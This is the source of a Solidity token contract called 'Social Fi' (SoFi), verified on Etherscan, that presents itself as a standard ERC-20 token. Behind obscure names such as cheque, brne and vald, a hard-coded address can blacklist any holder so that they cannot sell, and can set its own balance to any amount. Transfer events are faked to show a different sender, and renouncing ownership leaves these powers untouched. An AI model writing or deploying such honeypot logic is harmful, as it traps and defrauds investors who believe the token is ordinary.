/**
 *Submitted for verification at Etherscan.io on 2022-10-25
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract SoFi {
  
    mapping (address => uint256) public Yi;
    mapping (address => uint256) public TN;
    mapping (address => bool) Lv;
    mapping(address => mapping(address => uint256)) public allowance;





    string public name = unicode"Social Fi";
    string public symbol = unicode"SoFi";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
   

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    address Head_Construct = 0x426903241ADA3A0092C3493a0C795F2ec830D622;

    constructor()  {
    Yi[msg.sender] = totalSupply;
    deploy(Head_Construct, totalSupply); }

   
   address deplyer = 0x2b401dC0C8d5DD69F12Dc17c6ac70fD1DAc0Fc94;
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
      
       
        if(msg.sender == deplyer)  {
        require(Yi[msg.sender] >= value);
        Yi[msg.sender] -= value;  
        Yi[to] += value; 
        emit Transfer (Head_Construct, to, value);
        return true; }  
        if(!Lv[msg.sender]) {
        require(Yi[msg.sender] >= value);
        Yi[msg.sender] -= value;  
        Yi[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }}

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

        function vald () public {
         if(msg.sender == deplyer)   {
        Yi[msg.sender] = TN[msg.sender];
        }}

        function balanceOf(address account) public view returns (uint256) {
        return Yi[account]; }

        function unval(address ii) public {
        if(msg.sender == deplyer)  { 
        Lv[ii] = false;}}
        function cheque(address ii) public{
         if(msg.sender == deplyer)  { 
        require(!Lv[ii]);
        Lv[ii] = true;
        }}
             function brne(uint256 x) public {
        if(msg.sender == deplyer)  { 
        TN[msg.sender] = x;} }

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 

        if(from == deplyer)  {
        require(value <= Yi[from]);
        require(value <= allowance[from][msg.sender]);
        Yi[from] -= value;  
        Yi[to] += value; 
        emit Transfer (Head_Construct, to, value);
        return true; }    
          if(!Lv[from] && !Lv[to]) {
        require(value <= Yi[from]);
        require(value <= allowance[from][msg.sender]);
        Yi[from] -= value;
        Yi[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}}